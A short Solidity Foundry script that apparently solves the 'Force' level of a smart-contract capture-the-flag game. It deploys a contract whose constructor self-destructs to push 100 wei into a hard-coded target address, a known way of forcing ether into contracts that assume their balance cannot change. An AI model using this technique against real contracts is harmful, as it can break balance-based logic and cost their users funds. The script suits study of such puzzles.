// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Force} from "../src/level7Force.sol";

contract ToBeDestructed {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract level7Solution is Script {
    // address forceAddr = payable(0xbd06630eec0B38457abD3c88bF676203d321D6d8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 100 wei}(payable(0xbd06630eec0B38457abD3c88bF676203d321D6d8));
        vm.stopBroadcast();
    }
}
